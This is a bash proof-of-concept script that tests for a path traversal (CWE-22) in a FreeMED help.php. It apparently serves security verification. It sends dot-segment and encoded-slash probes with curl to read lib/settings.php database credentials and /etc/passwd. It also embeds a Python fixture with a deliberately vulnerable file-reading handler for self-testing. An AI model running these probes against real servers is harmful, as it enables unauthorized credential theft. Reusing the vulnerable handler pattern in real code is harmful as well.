#!/usr/bin/env bash
#
# repro-help-traversal.sh - hostile repro for CWE-22 (arbitrary file read) in help.php
#
# help.php derives the file it serves from PATH_INFO:
#
#     $fullpath = dirname(__FILE__)."/ui/${ui}/help/${locale}/${path}";
#
# with $path taken straight from PATH_INFO while only $ui and $locale are
# sanitised, so `..` sequences escape the help tree and read anything the web
# user can read (lib/settings.php -> DB credentials; /etc/passwd).
#
# Usage:
#   BASE=http://localhost:38081 [DOCROOT=/var/www/html] ./repro-help-traversal.sh
#   ./repro-help-traversal.sh --self-test
#
# Environment:
#   BASE     base URL of the deployment under test (default http://localhost:38081)
#   DOCROOT  on-disk docroot of that deployment; printed for reference only
#            (default /var/www/html, matching the Apache port of the verify stack)
#   TIMEOUT  per-request curl timeout in seconds (default 15)
#
# Exit codes:
#   0  measured negative - every probe was answered and none returned sensitive
#      content (this is a statement about the request the server REFUSED, see
#      "what this script can and cannot show" below)
#   1  EXPLOITED - at least one probe returned sensitive content
#   2  inconclusive - at least one probe got no response at all, so absence of
#      evidence proves nothing (deliberately distinct from 1)
#
#   --self-test exits 0 when every assertion held, 1 when one failed, 2 when the
#   fixture could not be started.
#
# Only `set -u` is used: every row must be attempted even when an earlier curl
# fails, and a failed curl must never abort the run.
#
# WHAT THIS SCRIPT CAN AND CANNOT SHOW
#
# Dot segments are collapsed CLIENT-side by curl unless `--path-as-is` is given,
# so every probe below passes it (an earlier revision did not, and as a result
# measured a normalised request while reporting "not vulnerable").
#
# They are also collapsed SERVER-side before PHP runs by modern Apache and nginx:
# measured on the FreeMED verify stack, Apache answers 400 for `..`/`%2e%2e` and
# 404 for `..%2f` (AllowEncodedSlashes Off), nginx answers 400. PHP never sees the
# dot segment, so on such a deployment a passing run means "the traversal request
# was refused upstream", NOT "the code is safe". The summary says exactly that.
#
# What makes the negative trustworthy is `--self-test`: it starts a tiny local
# HTTP fixture that hands the raw path to a deliberately vulnerable help.php
# (no docker, no Phase 0.3 stack, plain python3) and asserts that this script
# prints `>>> EXPLOITED` and exits 1 there - and that it does NOT when the same
# fixture serves a path-confined help.php, or when `--path-as-is` is withheld.
#
set -u

SELF="${BASH_SOURCE[0]}"
BASE="${BASE:-http://localhost:38081}"
DOCROOT="${DOCROOT:-/var/www/html}"
TIMEOUT="${TIMEOUT:-15}"
TMPDIR="${TMPDIR:-/tmp}"

# Probes. help.php resolves `ui/<ui>/help/<locale>/<page>` below the docroot, so
# 4 `..` from /gwt/en_US/... lands on the docroot itself (where lib/settings.php
# lives) and 8/9 `..` clamp at `/`.
PATHS=(
  "/gwt/en_US/main"                                            # control: legitimate help page
  "/gwt/en_US/../../../../lib/settings.php"                    # DB credentials
  "/gwt/en_US/../../../../../../../../etc/passwd"              # arbitrary absolute read
  "/gwt/en_US/../../../../../../../../../etc/passwd"           # extra .. clamps at /
  "/gwt/en_US/..%2f..%2f..%2f..%2flib/settings.php"            # encoded variant
)

# Sensitive markers. `DB_PASSWORD` is unanchored on purpose: a deployed
# lib/settings.php is generated from lib/settings.php.tpl and reads
#   define ('DB_PASSWORD', "...");
# so the brief's bare `^DB_PASSWORD` line anchor alone would miss it.
# The passwd marker tolerates HTML wrapping and leading indentation.
DBPW_RE='DB_PASSWORD'
PASSWD_RE='(^|[[:space:]<])root:[^[:space:]:]*:0:0:'

# --self-test fixture canary: a clearly fake value, written into the fixture's
# settings.php by --self-test only. The self-test asserts it never reaches stdout:
# that is the redaction assertion. It is not a credential.
CANARY='freemed-selftest-canary-value-must-never-be-printed'

# Temp file: mktemp only, no predictable fallback path anywhere.
if ! OUT="$(mktemp "${TMPDIR%/}/freemed-help-traversal.XXXXXX")"; then
  printf 'repro: mktemp failed in %s - refusing to fall back to a predictable path\n' "${TMPDIR%/}" >&2
  exit 2
fi

FIXDIR=""
PORTFILE=""
FIXPID=""
SELFTEST_TEMPS=""
cleanup() {
  [ -n "${OUT:-}" ] && rm -f "$OUT"
  [ -n "$PORTFILE" ] && rm -f "$PORTFILE"
  [ -n "$SELFTEST_TEMPS" ] && rm -f $SELFTEST_TEMPS
  [ -n "$FIXPID" ] && { kill "$FIXPID" 2>/dev/null; wait "$FIXPID" 2>/dev/null; }
  [ -n "$FIXDIR" ] && rm -rf "$FIXDIR"
  return 0
}
on_signal() {
  printf '\nrepro: interrupted\n' >&2
  cleanup
  exit 130
}
trap cleanup EXIT
trap on_signal INT TERM HUP

# curl option set. --path-as-is is mandatory; the override exists only so
# --self-test can prove that the override is what makes the difference.
CURL_OPTS=( --path-as-is )
CURL_NOTE='--path-as-is'
if [ "${REPRO_INTERNAL_DISABLE_PATH_AS_IS:-0}" = "1" ]; then
  # Internal, --self-test only. Never set this for a real measurement.
  CURL_OPTS=()
  CURL_NOTE='(path-as-is DISABLED - internal self-test mode, not a measurement)'
fi

C_EXPLOIT=0
C_REFUSED=0
C_AUTH=0
C_ANSWERED=0
C_UNREACH=0

run_suite() {
  local base="$1" p url code markers nbytes excerpt i total
  total=${#PATHS[@]}
  C_EXPLOIT=0; C_REFUSED=0; C_AUTH=0; C_ANSWERED=0; C_UNREACH=0
  i=0
  for p in "${PATHS[@]}"; do
    i=$((i + 1))
    url="$base/help.php$p"
    printf '[%s/%s] GET %s\n' "$i" "$total" "$url"
    : >"$OUT"
    # -s keeps curl quiet; -w still prints 000 when the connection fails.
    code="$(curl -s "${CURL_OPTS[@]}" --max-time "$TIMEOUT" -o "$OUT" -w '%{http_code}' "$url" 2>/dev/null)"
    code="${code:-000}"
    if [ "$code" = "000" ]; then
      C_UNREACH=$((C_UNREACH + 1))
      printf '      HTTP 000  UNREACHABLE: no response (connection refused / timed out)\n'
      continue
    fi

    nbytes="$(wc -c <"$OUT" | tr -d ' ')"
    markers=""
    if grep -qE "$DBPW_RE" "$OUT"; then markers='DB_PASSWORD'; fi
    if grep -qE "$PASSWD_RE" "$OUT"; then markers="${markers:+$markers,}passwd-uid0-entry"; fi

    if [ -n "$markers" ]; then
      C_EXPLOIT=$((C_EXPLOIT + 1))
      printf '      HTTP %s  >>> EXPLOITED: sensitive content returned (marker: %s)\n' "$code" "$markers"
      printf '      body(%s bytes): WITHHELD - a secret marker matched, so no response bytes are printed\n' "$nbytes"
      continue
    fi

    excerpt="$(head -c 160 "$OUT" | tr '\n\r\t' '   ')"
    case "$code" in
      400)
        C_REFUSED=$((C_REFUSED + 1))
        printf '      HTTP %s  refused by the web server before PHP ran (dot segment rejected as malformed)\n' "$code"
        ;;
      404)
        C_REFUSED=$((C_REFUSED + 1))
        printf '      HTTP %s  no handler for the (normalised) path: PHP was not reached (dot segment collapsed, or encoded slash refused)\n' "$code"
        ;;
      401|403)
        C_AUTH=$((C_AUTH + 1))
        printf '      HTTP %s  authentication required - no sensitive content returned\n' "$code"
        ;;
      *)
        C_ANSWERED=$((C_ANSWERED + 1))
        printf '      HTTP %s  answered (%s bytes, no sensitive marker)\n' "$code" "$nbytes"
        ;;
    esac
    printf '      body(no secret marker matched, excerpt as received): %s\n' "${excerpt:-<empty>}"
  done
  return 0
}

report() {
  local total="$1"
  printf '\n%s probe(s): %s exploited, %s refused/filtered before PHP (400/404), %s auth required (401/403), %s answered otherwise, %s no response\n' \
    "$total" "$C_EXPLOIT" "$C_REFUSED" "$C_AUTH" "$C_ANSWERED" "$C_UNREACH"

  if [ "$C_EXPLOIT" -gt 0 ]; then
    printf '>>> RESULT: EXPLOITED - %s/%s probe(s) returned sensitive content from %s\n' \
      "$C_EXPLOIT" "$total" "$BASE"
    return 1
  fi
  if [ "$C_UNREACH" -gt 0 ]; then
    printf '>>> RESULT: INCONCLUSIVE - %s/%s probe(s) got no response from %s, so nothing was proven\n' \
      "$C_UNREACH" "$total" "$BASE"
    return 2
  fi
  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)\n'
  printf '    What was measured: %s of %s probe(s) were refused or filtered by the web server\n' "$C_REFUSED" "$total"
  printf '    before PHP ran (HTTP 400/404 - dot segments normalised or rejected, encoded slash\n'
  printf '    refused); %s required authentication (401/403); %s reached PHP and returned no\n' "$C_AUTH" "$C_ANSWERED"
  printf '    sensitive marker.\n'
  printf '    No response body that matched a secret marker is printed by this script, and no\n'
  printf '    secret marker matched here, so the excerpts above are verbatim responses.\n'
  printf '    This is NOT a statement that help.php is safe: where the server collapses the dot\n'
  printf '    segment upstream the vulnerable code is never reached.\n'
  if [ "$C_AUTH" -gt 0 ]; then
    printf '    The %s row(s) that required authentication say nothing about path handling.\n' "$C_AUTH"
  fi
  printf '    Sensitivity of this probe set is proven by:\n'
  printf '      %s --self-test\n' "$SELF"
  return 0
}

# ---------------------------------------------------------------------------
# --self-test: prove the probe set still detects the traversal.
# ---------------------------------------------------------------------------
selftest() {
  if ! command -v python3 >/dev/null 2>&1; then
    printf 'self-test: python3 is required to run the fixture\n' >&2
    exit 2
  fi

  if ! FIXDIR="$(mktemp -d "${TMPDIR%/}/freemed-help-fixture.XXXXXX")"; then
    printf 'self-test: mktemp -d failed in %s\n' "${TMPDIR%/}" >&2
    exit 2
  fi
  if ! PORTFILE="$(mktemp "${TMPDIR%/}/freemed-help-fixture-port.XXXXXX")"; then
    printf 'self-test: mktemp failed for the port file\n' >&2
    exit 2
  fi
  rm -f "$PORTFILE"

  # Fixture tree. The fixture simulates a filesystem root with the docroot at
  # /var/www/html (the depth the probes assume) and supplies its own /etc/passwd,
  # so this never reads the host's real file.
  mkdir -p "$FIXDIR/vroot/var/www/html/lib" \
           "$FIXDIR/vroot/var/www/html/ui/gwt/help/en_US" \
           "$FIXDIR/vroot/etc" || exit 2
  cat >"$FIXDIR/vroot/var/www/html/lib/settings.php" <<EOF
<?php
 define ('DB_PASSWORD', "$CANARY");
 define ('DB_USER', 'canary-upgrade-user');
?>
EOF
  printf '<html><body>fixture help page: main</body></html>\n' \
    >"$FIXDIR/vroot/var/www/html/ui/gwt/help/en_US/main.en_US.html"
  printf 'root:x:0:0:root:/root:/bin/bash\ncanary:x:1001:1001:canary:/nonexistent:/bin/false\n' \
    >"$FIXDIR/vroot/etc/passwd"

  cat >"$FIXDIR/fixture.py" <<'PYEOF'
#!/usr/bin/env python3
"""Path-info-preserving HTTP fixture, for repro-help-traversal.sh --self-test.

Two behaviours behind one server, and NO dot-segment normalisation of the
request path - being path-info-preserving is the whole point:

  /vulnerable/help.php/<path>   pre-fix help.php: raw string concatenation,
                               readfile() on whatever PATH_INFO names
  /hardened/help.php/<path>    path-confined help.php: page tokens only,
                               realpath + confinement

The fixture root acts as a simulated filesystem root with the docroot at
/var/www/html (the depth the probes assume) and its own /etc/passwd, so it
never reads the host's real /etc/passwd.
"""
import http.server
import os
import re
import sys

FIXDIR, PORTFILE = sys.argv[1], sys.argv[2]
VROOT = os.path.join(FIXDIR, "vroot")
DOC_V = "/var/www/html"
UI_RE = re.compile(r"^[A-Za-z]+$")
LOC_RE = re.compile(r"^[A-Za-z_]+$")
PAGE_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")


def vresolve(base_v, page):
    """Kernel-style resolution, clamping `..` at the simulated filesystem root."""
    comps = []
    for c in (base_v + "/" + page).split("/"):
        if c in ("", "."):
            continue
        if c == "..":
            if comps:
                comps.pop()
            continue
        comps.append(c)
    return "/" + "/".join(comps)


def disk(vpath):
    return os.path.join(VROOT, vpath.lstrip("/"))


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"

    def log_message(self, *a):  # keep the server log quiet
        pass

    def reply(self, code, body, ctype="text/plain"):
        raw = body.encode("utf-8", "replace") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        raw = self.path  # handed over untouched: no normalisation anywhere
        if raw.startswith("/vulnerable/help.php"):
            mode, pinfo = "vulnerable", raw[len("/vulnerable/help.php"):]
        elif raw.startswith("/hardened/help.php"):
            mode, pinfo = "hardened", raw[len("/hardened/help.php"):]
        else:
            self.reply(404, "fixture: unknown path")
            return

        parts = pinfo.split("/")
        ui = parts[1] if len(parts) > 1 else ""
        locale = parts[2] if (len(parts) > 2 and parts[2]) else "en_US"
        if not UI_RE.match(ui) or not LOC_RE.match(locale):
            self.reply(200, "Hack attempt.\n")
            return
        page = "/".join(parts[3:]) if len(parts) > 3 else ""
        base_v = DOC_V + "/ui/" + ui + "/help/" + locale

        if mode == "hardened":
            p = re.sub(r"\." + re.escape(locale) + r"$", "", page)
            if p == "" or not PAGE_RE.match(p) or ".." in p:
                self.reply(404, "Help index not present.")
                return
            fp = disk(vresolve(base_v, p + "." + locale + ".html"))
            if not os.path.isfile(fp):
                self.reply(404, "Help index not present.")
                return
            with open(fp, "rb") as fh:
                self.reply(200, fh.read(), "text/html")
            return

        # pre-fix behaviour: raw concatenation then readfile()
        fp = disk(vresolve(base_v, page))
        if os.path.isfile(fp + "." + locale + ".html"):
            fp = fp + "." + locale + ".html"
        if not os.path.isfile(fp):
            self.reply(200, "Help index %s not present." % page)
            return
        with open(fp, "rb") as fh:
            self.reply(200, fh.read(), "text/html")


httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
with open(PORTFILE, "w") as fh:
    fh.write(str(httpd.server_address[1]))
httpd.serve_forever()
PYEOF

  python3 "$FIXDIR/fixture.py" "$FIXDIR" "$PORTFILE" >"$FIXDIR/server.log" 2>&1 &
  FIXPID=$!

  # Readiness: wait for the fixture to publish its port, then confirm it answers.
  local n=0
  while [ ! -s "$PORTFILE" ] && [ "$n" -lt 100 ]; do
    if ! kill -0 "$FIXPID" 2>/dev/null; then break; fi
    sleep 0.1
    n=$((n + 1))
  done
  if [ ! -s "$PORTFILE" ]; then
    printf 'self-test: fixture did not start; server log follows\n' >&2
    cat "$FIXDIR/server.log" >&2 2>/dev/null
    exit 2
  fi
  local PORT VULN_BASE HARD_BASE
  PORT="$(cat "$PORTFILE")"
  VULN_BASE="http://127.0.0.1:$PORT/vulnerable"
  HARD_BASE="http://127.0.0.1:$PORT/hardened"
  n=0
  while [ "$n" -lt 50 ]; do
    if [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$VULN_BASE/help.php/gwt/en_US/main")" = "200" ]; then break; fi
    sleep 0.1
    n=$((n + 1))
  done

  printf 'self-test: fixture on 127.0.0.1:%s (vulnerable + hardened help.php, path-info preserving)\n' "$PORT"
  printf 'self-test: no docker, no Phase 0.3 stack; the fixture tree lives in %s and is removed on exit\n\n' "$FIXDIR"

  SELFTEST_FAIL=0
  local RC=0 CASE_OUT=""
  check_eq() { # desc expected actual
    if [ "$2" = "$3" ]; then
      printf '    PASS  %s (expected %s, got %s)\n' "$1" "$2" "$3"
    else
      printf '    FAIL  %s (expected %s, got %s)\n' "$1" "$2" "$3"
      SELFTEST_FAIL=$((SELFTEST_FAIL + 1))
    fi
  }
  check_has() { # desc needle file
    if grep -qF -- "$2" "$3"; then
      printf '    PASS  %s\n' "$1"
    else
      printf '    FAIL  %s (not found in output: %s)\n' "$1" "$2"
      SELFTEST_FAIL=$((SELFTEST_FAIL + 1))
    fi
  }
  check_absent() { # desc needle file
    if grep -qF -- "$2" "$3"; then
      printf '    FAIL  %s (should NOT appear in output: %s)\n' "$1" "$2"
      SELFTEST_FAIL=$((SELFTEST_FAIL + 1))
    else
      printf '    PASS  %s\n' "$1"
    fi
  }
  run_case() { # label base disable_path_as_is
    printf -- '--- %s\n' "$1"
    printf '    target: %s   (%s)\n' "$2" "$([ "$3" = "1" ] && printf 'path-as-is DISABLED' || printf 'path-as-is honoured')"
    if ! CASE_OUT="$(mktemp "${TMPDIR%/}/freemed-selftest-out.XXXXXX")"; then
      printf 'self-test: mktemp failed\n' >&2
      exit 2
    fi
    SELFTEST_TEMPS="$SELFTEST_TEMPS $CASE_OUT"
    BASE="$2" DOCROOT=/var/www/html TIMEOUT="$TIMEOUT" TMPDIR="$TMPDIR" \
      REPRO_INTERNAL_DISABLE_PATH_AS_IS="$3" \
      bash "$SELF" >"$CASE_OUT" 2>&1
    RC=$?
    sed 's/^/    | /' "$CASE_OUT"
    printf '\n'
  }

  printf '== case A: deliberately vulnerable help.php, path-info-preserving server\n'
  printf '   expected: >>> EXPLOITED, exit 1\n'
  run_case "A vulnerable fixture" "$VULN_BASE" 0
  check_eq "A exit code is 1 (EXPLOITED)" 1 "$RC"
  check_has "A prints >>> EXPLOITED" ">>> EXPLOITED" "$CASE_OUT"
  check_has "A flags the settings.php row as exploited" "help.php/gwt/en_US/../../../../lib/settings.php" "$CASE_OUT"
  check_has "A flags the /etc/passwd row as exploited" "help.php/gwt/en_US/../../../../../../../../etc/passwd" "$CASE_OUT"
  check_has "A flags it because a secret marker matched" "marker: DB_PASSWORD" "$CASE_OUT"
  check_absent "A withholds the body: the fixture DB password canary is not printed" "$CANARY" "$CASE_OUT"
  check_absent "A withholds the body: no /etc/passwd uid-0 line is printed" "root:x:0:0:" "$CASE_OUT"
  check_has "A reports the full request URL for every probe" "GET http://127.0.0.1:" "$CASE_OUT"

  printf '== case B: path-confined help.php (the fix), same path-info-preserving server\n'
  printf '   expected: no EXPLOITED, exit 0\n'
  run_case "B hardened fixture" "$HARD_BASE" 0
  check_eq "B exit code is 0 (measured negative)" 0 "$RC"
  check_absent "B does not print >>> EXPLOITED" ">>> EXPLOITED" "$CASE_OUT"
  check_has "B says what it measured (NO EXPLOIT OBSERVED)" "NO EXPLOIT OBSERVED" "$CASE_OUT"
  check_absent "B does not print the fixture canary" "$CANARY" "$CASE_OUT"

  printf '== case C: vulnerable fixture but --path-as-is withheld (regression guard)\n'
  printf '   this is the reviewed bug: curl normalises client-side, the server sees a\n'
  printf '   clean path, and a vulnerable server is reported clean. Expected: no EXPLOITED.\n'
  run_case "C vulnerable fixture, path-as-is disabled" "$VULN_BASE" 1
  check_eq "C exit code is 0 (the misleading clean result the bug produced)" 0 "$RC"
  check_absent "C does not print >>> EXPLOITED" ">>> EXPLOITED" "$CASE_OUT"
  check_has "C is why --path-as-is is mandatory" "path-as-is DISABLED" "$CASE_OUT"

  if [ "$SELFTEST_FAIL" -eq 0 ]; then
    printf '>>> SELF-TEST PASSED - this probe set detects the traversal when a server hands the raw path to a vulnerable help.php, and stays quiet against a fixed one\n'
    return 0
  fi
  printf '>>> SELF-TEST FAILED - %s assertion(s) did not hold; do not trust this script as a baseline\n' "$SELFTEST_FAIL"
  return 1
}

case "${1:-}" in
  --self-test|--selftest)
    selftest
    exit $?
    ;;
  ""|--run)
    ;;
  -h|--help)
    printf 'usage: BASE=<url> [DOCROOT=<path>] %s [--self-test]\n' "$SELF"
    exit 0
    ;;
  *)
    printf 'usage: BASE=<url> [DOCROOT=<path>] %s [--self-test]\n' "$SELF" >&2
    exit 2
    ;;
esac

printf 'repro: help.php unauthenticated path traversal (CWE-22)\n'
printf 'base=%s  docroot=%s  curl=%s\n' "$BASE" "$DOCROOT" "$CURL_NOTE"
printf 'note: a response body is printed only when no secret marker matched it;\n'
printf '      a matched body is reported by size and marker name, bytes withheld.\n\n'

run_suite "$BASE"
report "${#PATHS[@]}"
exit $?
